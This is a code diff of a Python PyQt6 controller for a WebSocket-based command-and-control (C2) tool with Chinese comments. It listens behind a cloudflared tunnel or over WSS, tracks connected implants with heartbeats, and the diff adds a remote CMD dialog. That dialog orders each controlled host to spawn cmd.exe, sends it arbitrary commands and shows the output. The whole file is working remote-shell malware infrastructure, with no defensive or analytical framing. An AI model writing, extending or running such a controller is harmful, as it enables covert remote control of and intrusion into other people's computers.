@@ -6,9 +6,9 @@ import hashlib
 import base64
 from datetime import datetime
 from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
-                             QTextEdit, QLineEdit, QPushButton, QLabel, QRadioButton, QButtonGroup,
-                             QListView, QAbstractListModel)
-from PyQt6.QtCore import Qt, QObject, pyqtSignal, QTimer
+                             QLabel, QLineEdit, QPushButton, QListView, QTextEdit, QDialog,
+                             QMenu, QAbstractItemView, QRadioButton, QButtonGroup)
+from PyQt6.QtCore import Qt, QAbstractListModel, QVariant, QModelIndex, pyqtSignal, QObject, pyqtSlot, QTimer
 import struct
 
 WS_OP_CONTINUE = 0x00
@@ -20,106 +20,138 @@ WS_OP_PONG = 0x0A
 
 
 def ws_compute_accept(key: bytes) -> bytes:
+    """计算标准Sec-WebSocket-Accept应答值"""
     magic = b"258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
     sha1 = hashlib.sha1(key + magic).digest()
     return base64.b64encode(sha1)
 
 
-def ws_unmask_payload(payload: bytes, mask: bytes) -> bytes:
-    return bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
+def ws_unmask_payload(payload: bytes, mask_key: bytes) -> bytes:
+    """服务端：对客户端带mask的payload解掩码"""
+    return bytes(b ^ mask_key[i % 4] for i, b in enumerate(payload))
 
 
-def ws_build_frame(opcode: int, payload: bytes, mask: bool = False) -> bytes:
-    frame = bytearray()
-    fin = 1 << 7
-    frame.append(fin | opcode)
+def ws_build_server_frame(fin: bool, opcode: int, payload: bytes) -> bytes:
+    """
+    构建服务端WebSocket帧：**服务端禁止mask**
+    """
+    header = bytearray()
+    # 第一个字节 fin + opcode
+    b1 = (0x80 if fin else 0) | (opcode & 0x0f)
+    header.append(b1)
+
     length = len(payload)
-    if length < 126:
-        len_byte = length
+    b2 = 0  # 服务端 mask位=0
+
+    if length <= 125:
+        b2 |= length
+        header.append(b2)
     elif length <= 0xFFFF:
-        len_byte = 126
+        b2 |= 126
+        header.append(b2)
+        header.extend(struct.pack(">H", length))
     else:
-        len_byte = 127
-    if mask:
-        len_byte |= 0x80
-    frame.append(len_byte)
-    if len_byte == 126:
-        frame.extend(struct.pack(">H", length))
-    elif len_byte == 127:
-        frame.extend(struct.pack(">Q", length))
-    if mask:
-        import os
-        mask_key = os.urandom(4)
-        frame.extend(mask_key)
-        masked = bytes(b ^ mask_key[i % 4] for i, b in enumerate(payload))
-        frame.extend(masked)
-    else:
-        frame.extend(payload)
-    return bytes(frame)
+        b2 |= 127
+        header.append(b2)
+        header.extend(struct.pack(">Q", length))
+
+    # 服务端不加mask key，直接拼接payload
+    return bytes(header) + payload
 
 
-def ws_parse_frame(data: bytes):
+def ws_parse_frame(data: bytearray):
+    """
+    解析WebSocket帧（服务端，客户端发来带mask）
+    返回：(fin, opcode, payload, consumed_bytes)
+    数据不足返回 (None, None, None, 0)；协议错误返回None
+    """
     if len(data) < 2:
-        return None, 0, None
-    b0 = data[0]
-    b1 = data[1]
-    fin = (b0 >> 7) & 1
-    opcode = b0 & 0x0F
-    masked = (b1 >> 7) & 1
-    payload_len = b1 & 0x7F
-    offset = 2
+        return (None, None, None, 0)
+    p = 0
+    b1 = data[p]
+    p += 1
+    b2 = data[p]
+    p += 1
+
+    fin = bool(b1 & 0x80)
+    opcode = b1 & 0x0F
+    has_mask = bool(b2 & 0x80)
+    payload_len = b2 & 0x7F
+
     if payload_len == 126:
-        if len(data) < offset + 2:
-            return None, 0, None
-        payload_len = struct.unpack(">H", data[offset:offset+2])[0]
-        offset += 2
+        if len(data) < p + 2:
+            return (None, None, None, 0)
+        payload_len = struct.unpack(">H", data[p:p+2])[0]
+        p += 2
     elif payload_len == 127:
-        if len(data) < offset + 8:
-            return None, 0, None
-        payload_len = struct.unpack(">Q", data[offset:offset+8])[0]
-        offset += 8
+        if len(data) < p + 8:
+            return (None, None, None, 0)
+        payload_len = struct.unpack(">Q", data[p:p+8])[0]
+        p += 8
+
     mask_key = b""
-    if masked:
-        if len(data) < offset + 4:
-            return None, 0, None
-        mask_key = data[offset:offset+4]
-        offset += 4
-    total_need = offset + payload_len
+    if has_mask:
+        if len(data) < p + 4:
+            return (None, None, None, 0)
+        mask_key = data[p:p+4]
+        p += 4
+
+    total_need = p + payload_len
     if len(data) < total_need:
-        return None, total_need, None
-    payload_raw = data[offset:offset+payload_len]
-    if masked:
-        payload = ws_unmask_payload(payload_raw, mask_key)
+        return (None, None, None, 0)
+
+    raw_payload = data[p:p+payload_len]
+    if has_mask:
+        payload = ws_unmask_payload(raw_payload, mask_key)
     else:
-        payload = payload_raw
-    return (fin, opcode, payload), total_need, data[total_need:]
+        payload = raw_payload
+
+    consumed = total_need
+    return (fin, opcode, payload, consumed)
 
 
-def ws_handle_http_handshake(sock: socket.socket, recv_buf: bytes):
+def ws_handle_http_upgrade(sock: socket.socket) -> bool:
+    """处理WebSocket HTTP GET /ws 101升级握手，兼容普通socket / ssl socket"""
+    buf = bytearray()
+    sock.settimeout(3.0)
     try:
-        header_end = recv_buf.find(b"\r\n\r\n")
-        if header_end == -1:
-            return None
-        headers_raw = recv_buf[:header_end].decode("latin‑1")
-        lines = headers_raw.split("\r\n")
-        ws_key = None
-        for line in lines[1:]:
-            if line.lower().startswith("sec‑websocket‑key:"):
-                ws_key = line.split(":",1)[1].strip().encode("ascii")
+        while True:
+            chunk = sock.recv(1024)
+            if not chunk:
+                return False
+            buf.extend(chunk)
+            if b"\r\n\r\n" in buf:
                 break
-        if ws_key is None:
-            return None
-        accept_key = ws_compute_accept(ws_key)
-        resp = (
-            b"HTTP/1.1 101 Switching Protocols\r\n"
-            b"Upgrade: websocket\r\n"
-            b"Connection: Upgrade\r\n"
-            b"Sec‑WebSocket‑Accept: " + accept_key + b"\r\n\r\n"
-        )
-        sock.sendall(resp)
-        return recv_buf[header_end+4:]
     except Exception:
-        return None
+        return False
+    sock.settimeout(None)
+
+    if b"Upgrade: websocket" not in buf or b"Sec-WebSocket-Key:" not in buf:
+        return False
+
+    # 提取 Sec-WebSocket-Key
+    key_line = None
+    for line in buf.split(b"\r\n"):
+        if line.lower().startswith(b"sec-websocket-key:"):
+            key_line = line
+            break
+    if not key_line:
+        return False
+    client_key = key_line.split(b":", 1)[1].strip()
+    accept_val = ws_compute_accept(client_key)
+
+    resp = (
+        b"HTTP/1.1 101 Switching Protocols\r\n"
+        b"Upgrade: websocket\r\n"
+        b"Connection: Upgrade\r\n"
+        b"Sec-WebSocket-Accept: " + accept_val + b"\r\n"
+        b"\r\n"
+    )
+    try:
+        sock.sendall(resp)
+    except Exception:
+        return False
+    return True
 
 
 class ClientSignals(QObject):
@@ -132,116 +164,161 @@ class ClientSession:
         self.conn = conn
         self.addr = addr
         self.ip_str = f"{addr[0]}:{addr[1]}"
+        self.last_pong = datetime.now()
         self.connected = True
-        self.recv_buf = bytearray()
+        self._recv_buf = bytearray()
         self.signals = ClientSignals()
-        self.lock = threading.Lock()
+        self._send_lock = threading.Lock()
+        # ws分片缓存
+        self._frag_buf = bytearray()
+        self._frag_opcode = 0
 
-    def send_packet(self, body: bytes):
+    def send_packet(self, body: bytes) -> bool:
+        """
+        上层调用和原来完全一样！
+        body就是原来业务包(PING/SPAW/KILL/EXEK...)，内部包装成WebSocket BINARY帧
+        """
         if not self.connected:
             return False
         try:
-            frame = ws_build_frame(WS_OP_BINARY, body, mask=False)
-            with self.lock:
-                self.conn.sendall(frame)
+            ws_frame = ws_build_server_frame(True, WS_OP_BINARY, body)
+            with self._send_lock:
+                self.conn.sendall(ws_frame)
             return True
-        except Exception:
+        except (OSError, BrokenPipeError, ssl.SSLError):
             self.close()
             return False
+
+    def reset_fragment(self):
+        self._frag_buf.clear()
+        self._frag_opcode = 0
 
     def close(self):
         self.connected = False
         try:
+            frame_close = ws_build_server_frame(True, WS_OP_CLOSE, b"")
+            self.conn.sendall(frame_close)
+        except Exception:
+            pass
+        try:
+            self.conn.shutdown(socket.SHUT_RDWR)
+        except Exception:
+            pass
+        try:
             self.conn.close()
         except Exception:
             pass
-        self.signals.on_disconnect.emit(self)
-
-    def run_loop(self):
-        try:
-            while self.connected:
-                chunk = self.conn.recv(4096)
-                if not chunk:
-                    break
-                self.recv_buf.extend(chunk)
-                while len(self.recv_buf) > 0:
-                    parsed, need, remain = ws_parse_frame(bytes(self.recv_buf))
-                    if parsed is None:
-                        if need > 0:
-                            break
-                        else:
-                            self.recv_buf = bytearray(remain)
-                            continue
-                    fin, opcode, payload = parsed
-                    self.recv_buf = bytearray(remain)
-                    if opcode == WS_OP_CLOSE:
-                        self.close()
-                        return
-                    elif opcode == WS_OP_PING:
-                        pong = ws_build_frame(WS_OP_PONG, b"", mask=False)
-                        with self.lock:
-                            self.conn.sendall(pong)
-                    elif opcode == WS_OP_BINARY:
-                        self.signals.on_outp.emit(self, payload.decode("gbk", errors="replace"))
-        except Exception:
-            pass
-        self.close()
 
 
-class SimpleListModel(QAbstractListModel):
+class RemoteCmdDialog(QDialog):
+    def __init__(self, client_session: ClientSession, parent=None):
+        super().__init__(parent)
+        self.main_window = parent
+        self.setWindowTitle(f"远程CMD - {client_session.ip_str}")
+        self.resize(680, 450)
+        self.client = client_session
+        self.is_alive = True
+
+        lay = QVBoxLayout(self)
+        self.out_box = QTextEdit()
+        self.out_box.setReadOnly(True)
+        lay.addWidget(self.out_box)
+
+        input_lay = QHBoxLayout()
+        self.cmd_input = QLineEdit()
+        self.cmd_input.setPlaceholderText("输入命令回车执行")
+        self.cmd_input.returnPressed.connect(self.on_enter_command)
+        input_lay.addWidget(self.cmd_input)
+        lay.addLayout(input_lay)
+
+        self.out_box.append(f"==== 连接 {self.client.ip_str} 远程CMD ====\n[*] 已发送SPAW启动被控端cmd.exe")
+        self.client.send_packet(b"SPAW")
+
+    @pyqtSlot(str)
+    def append_text(self, text: str):
+        self.out_box.append(text)
+
+    def on_enter_command(self):
+        cmd = self.cmd_input.text().strip()
+        self.cmd_input.clear()
+        if not self.is_alive or not self.client.connected:
+            self.out_box.append("\n[!] 连接断开")
+            return
+        payload = b"EXEK" + cmd.encode("gbk", errors="replace")
+        ok = self.client.send_packet(payload)
+        self.out_box.append(f"> {cmd}")
+        if not ok:
+            self.out_box.append("[发送失败]")
+
+    def closeEvent(self, event):
+        self.is_alive = False
+        if self.client.connected:
+            self.client.send_packet(b"KILL")
+        if self.main_window and self.client in self.main_window.open_cmd_dialogs:
+            del self.main_window.open_cmd_dialogs[self.client]
+        super().closeEvent(event)
+
+
+class ClientListModel(QAbstractListModel):
     def __init__(self):
         super().__init__()
-        self.items = []
+        self.items: list[ClientSession] = []
 
-    def rowCount(self, parent=None):
+    def rowCount(self, parent=QModelIndex()):
         return len(self.items)
 
-    def data(self, index, role=Qt.ItemDataRole.DisplayRole):
-        if index.isValid() and role == Qt.ItemDataRole.DisplayRole:
-            return self.items[index.row()].ip_str
-        return None
+    def data(self, index: QModelIndex, role=Qt.ItemDataRole.DisplayRole):
+        if not index.isValid() or role != Qt.ItemDataRole.DisplayRole:
+            return QVariant()
+        s = self.items[index.row()]
+        return QVariant(f"{s.ip_str} | last_pong:{s.last_pong.strftime('%H:%M:%S')}")
 
-    def add(self, sess):
-        self.beginInsertRows(Qt.QModelIndex(), len(self.items), len(self.items))
+    def add(self, sess: ClientSession):
+        self.beginInsertRows(QModelIndex(), len(self.items), len(self.items))
         self.items.append(sess)
         self.endInsertRows()
 
-    def remove_by_obj(self, sess):
-        if sess in self.items:
-            idx = self.items.index(sess)
-            self.beginRemoveRows(Qt.QModelIndex(), idx, idx)
-            self.items.pop(idx)
-            self.endRemoveRows()
+    def remove_by_obj(self, sess: ClientSession):
+        idx = self.items.index(sess)
+        self.beginRemoveRows(QModelIndex(), idx, idx)
+        self.items.pop(idx)
+        self.endRemoveRows()
 
 
 class MainWindow(QMainWindow):
     def __init__(self):
         super().__init__()
-        self.setWindowTitle("WS C2主控")
+        self.setWindowTitle("WS / WSS WebSocket反向控制主控端")
         self.resize(720, 520)
         self.server_sock: socket.socket | None = None
+        self.ssl_context = None
         self.server_running = False
-        self.client_model = SimpleListModel()
+        self.client_model = ClientListModel()
+        self.open_cmd_dialogs: dict[ClientSession, RemoteCmdDialog] = {}
 
         w = QWidget()
         self.setCentralWidget(w)
         lay = QVBoxLayout(w)
 
         top_lay = QHBoxLayout()
+        # 模式切换单选
         self.radio_ws = QRadioButton("明文 WS (cloudflared隧道)")
         self.radio_wss = QRadioButton("WSS加密 (agent直连)")
         self.radio_ws.setChecked(True)
         self.mode_group = QButtonGroup()
         self.mode_group.addButton(self.radio_ws)
         self.mode_group.addButton(self.radio_wss)
+        # 切换单选时自动填充默认端口，用户仍可手动修改
         self.radio_ws.toggled.connect(self.on_mode_switch)
         self.radio_wss.toggled.connect(self.on_mode_switch)
 
         top_lay.addWidget(self.radio_ws)
         top_lay.addWidget(self.radio_wss)
+
         top_lay.addWidget(QLabel("监听端口:"))
         self.port_edit = QLineEdit("3306")
         top_lay.addWidget(self.port_edit)
+
         self.btn_start = QPushButton("启动监听")
         self.btn_start.clicked.connect(self.start_server)
         top_lay.addWidget(self.btn_start)
@@ -251,116 +328,201 @@ class MainWindow(QMainWindow):
         top_lay.addWidget(self.btn_stop)
         lay.addLayout(top_lay)
 
-        self.list_view = QListView()
-        self.list_view.setModel(self.client_model)
-        lay.addWidget(self.list_view)
+        self.view = QListView()
+        self.view.setModel(self.client_model)
+        self.view.setSelectionMode(QAbstractItemView.SelectionMode.SingleSelection)
+        self.view.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
+        self.view.customContextMenuRequested.connect(self.on_context_menu)
+        lay.addWidget(self.view)
 
         self.log_box = QTextEdit()
         self.log_box.setReadOnly(True)
         lay.addWidget(self.log_box)
 
-        self.ping_timer = QTimer()
+        # 心跳定时器：10秒发一次PING
+        self.ping_timer = QTimer(self)
         self.ping_timer.setInterval(10000)
         self.ping_timer.timeout.connect(self.broadcast_ping)
 
     def on_mode_switch(self):
+        """切换模式自动填入默认端口，允许用户手动改写输入框"""
         if self.radio_ws.isChecked():
             self.port_edit.setText("3306")
         else:
             self.port_edit.setText("4433")
 
     def log(self, msg):
-        t = datetime.now().strftime("%H:%M:%S")
-        self.log_box.append(f"[{t}] {msg}")
+        self.log_box.append(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")
 
+    @pyqtSlot()
     def broadcast_ping(self):
-        for sess in self.client_model.items:
-            sess.send_packet(b"PING")
+        for sess in list(self.client_model.items):
+            if sess.connected:
+                sess.send_packet(b"PING")
 
-    def accept_loop(self, use_wss: bool, port: int):
-        try:
-            while self.server_running:
+    def accept_loop(self):
+        use_wss = self.radio_wss.isChecked()
+        while self.server_running:
+            try:
                 raw_conn, addr = self.server_sock.accept()
+                client_conn = raw_conn
+                # 如果WSS模式，则执行TLS包装
                 if use_wss:
-                    ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
-                    ctx.load_cert_chain(certfile="server.crt", keyfile="server.key")
                     try:
-                        conn = ctx.wrap_socket(raw_conn, server_side=True)
-                    except Exception as e:
+                        client_conn = self.ssl_context.wrap_socket(raw_conn, server_side=True)
+                    except ssl.SSLError as e:
                         self.log(f"TLS握手失败 {addr}: {e}")
                         raw_conn.close()
                         continue
-                else:
-                    conn = raw_conn
 
-                buf = bytearray()
-                try:
-                    conn.settimeout(3.0)
-                    buf += conn.recv(1024)
-                    conn.settimeout(None)
-                except Exception:
-                    conn.close()
+                # WebSocket HTTP Upgrade握手
+                ok_handshake = ws_handle_http_upgrade(client_conn)
+                if not ok_handshake:
+                    self.log(f"WebSocket HTTP升级握手失败 {addr}")
+                    client_conn.close()
                     continue
 
-                after_handshake = ws_handle_http_handshake(conn, bytes(buf))
-                if after_handshake is None:
-                    conn.close()
-                    continue
-
-                sess = ClientSession(conn, addr)
-                sess.recv_buf = bytearray(after_handshake)
-                sess.signals.on_outp.connect(self.on_client_output)
-                sess.signals.on_disconnect.connect(self.on_client_disconnect)
+                sess = ClientSession(client_conn, addr)
+                sess.signals.on_outp.connect(self.handle_session_outp)
+                sess.signals.on_disconnect.connect(self.handle_session_disconnect)
                 self.client_model.add(sess)
                 self.log(f"[新接入] {sess.ip_str}")
-                threading.Thread(target=sess.run_loop, daemon=True).start()
-        except OSError:
-            pass
+                t = threading.Thread(target=self.client_recv_loop, args=(sess,), daemon=True)
+                t.start()
+            except OSError:
+                break
 
-    def on_client_output(self, sess, text):
-        self.log(f"[{sess.ip_str}] {text}")
+    @pyqtSlot(object, str)
+    def handle_session_outp(self, sess: ClientSession, text: str):
+        if sess in self.open_cmd_dialogs:
+            dlg = self.open_cmd_dialogs[sess]
+            dlg.append_text(text)
 
-    def on_client_disconnect(self, sess):
-        self.log(f"[断开] {sess.ip_str}")
+    @pyqtSlot(object)
+    def handle_session_disconnect(self, sess: ClientSession):
+        if sess in self.open_cmd_dialogs:
+            dlg = self.open_cmd_dialogs.pop(sess)
+            dlg.append_text("\n[!] WebSocket连接已经断开")
         self.client_model.remove_by_obj(sess)
+        self.log(f"[断开] {sess.ip_str}")
+
+    def client_recv_loop(self, sess: ClientSession):
+        buf = sess._recv_buf
+        while sess.connected:
+            try:
+                chunk = sess.conn.recv(4096)
+                if not chunk:
+                    break
+                buf.extend(chunk)
+
+                while True:
+                    ret = ws_parse_frame(buf)
+                    fin, opcode, payload, consumed = ret
+                    if consumed <= 0:
+                        break
+                    # 移除已经消费的数据
+                    del buf[:consumed]
+
+                    # 处理控制帧 PING/PONG/CLOSE
+                    if opcode == WS_OP_PING:
+                        pong_frame = ws_build_server_frame(True, WS_OP_PONG, payload)
+                        with sess._send_lock:
+                            sess.conn.sendall(pong_frame)
+                        continue
+                    elif opcode == WS_OP_PONG:
+                        continue
+                    elif opcode == WS_OP_CLOSE:
+                        break
+                    elif opcode in (WS_OP_BINARY, WS_OP_CONTINUE):
+                        # 处理分片
+                        if opcode == WS_OP_BINARY:
+                            sess.reset_fragment()
+                            sess._frag_opcode = opcode
+                        sess._frag_buf.extend(payload)
+                        if fin:
+                            full_body = bytes(sess._frag_buf)
+                            sess.reset_fragment()
+                            # full_body == 原来裸TLS的body，业务逻辑完全复用！
+                            if len(full_body) >= 4:
+                                cmd_code = full_body[0:4]
+                                if cmd_code == b"PONG":
+                                    sess.last_pong = datetime.now()
+                                    self.client_model.dataChanged.emit(QModelIndex(), QModelIndex())
+                                elif cmd_code == b"OUTP":
+                                    output_bytes = full_body[4:]
+                                    out_text = output_bytes.decode("gbk", errors="replace")
+                                    sess.signals.on_outp.emit(sess, out_text)
+
+            except (OSError, ssl.SSLError):
+                break
+        sess.close()
+        sess.signals.on_disconnect.emit(sess)
 
     def start_server(self):
-        if self.server_running:
-            return
         port = int(self.port_edit.text())
         use_wss = self.radio_wss.isChecked()
 
+        if use_wss:
+            self.ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+            self.ssl_context.load_cert_chain(certfile="server.crt", keyfile="server.key")
+            self.log(f"WSS加密模式启动，监听端口 {port}，需要server.crt/server.key")
+        else:
+            self.ssl_context = None
+            self.log(f"明文WS模式启动，监听端口 {port}，对接cloudflared隧道")
+
         self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        # ========== 修改点：绑定127.0.0.1，仅本机可访问 ==========
+        # ========== 修改：绑定127.0.0.1，仅本机cloudflared可以访问 ==========
         self.server_sock.bind(("127.0.0.1", port))
         self.server_sock.listen(8)
         self.server_running = True
+        threading.Thread(target=self.accept_loop, daemon=True).start()
 
-        if use_wss:
-            self.log(f"WSS加密模式启动，监听 127.0.0.1:{port}，需要 server.crt / server.key")
-        else:
-            self.log(f"明文WS模式启动，监听 127.0.0.1:{port}，配合cloudflared使用")
+        self.ping_timer.start()
 
         self.btn_start.setEnabled(False)
         self.btn_stop.setEnabled(True)
-        self.ping_timer.start()
-        threading.Thread(target=self.accept_loop, args=(use_wss, port), daemon=True).start()
 
     def stop_server(self):
-        self.server_running = False
         self.ping_timer.stop()
-        if self.server_sock is not None:
+
+        self.server_running = False
+        if self.server_sock:
             try:
                 self.server_sock.close()
             except Exception:
                 pass
-            self.server_sock = None
-        for s in list(self.client_model.items):
+        for s in self.client_model.items:
             s.close()
-        self.log("监听已停止")
+        self.open_cmd_dialogs.clear()
         self.btn_start.setEnabled(True)
         self.btn_stop.setEnabled(False)
+        self.log("监听已停止")
+
+    def on_context_menu(self, pos):
+        idx = self.view.indexAt(pos)
+        if not idx.isValid():
+            return
+        sess: ClientSession = self.client_model.items[idx.row()]
+        menu = QMenu()
+        act_open_cmd = menu.addAction("打开远程CMD会话")
+        ret = menu.exec(self.view.viewport().mapToGlobal(pos))
+        if ret == act_open_cmd:
+            if sess in self.open_cmd_dialogs:
+                dlg = self.open_cmd_dialogs[sess]
+                if dlg.isVisible():
+                    dlg.raise_()
+                    dlg.activateWindow()
+                    return
+                else:
+                    del self.open_cmd_dialogs[sess]
+            dlg = RemoteCmdDialog(sess, parent=self)
+            self.open_cmd_dialogs[sess] = dlg
+            dlg.show()
+
+    def closeEvent(self, event):
+        self.stop_server()
+        event.accept()
 
 
 if __name__ == "__main__":
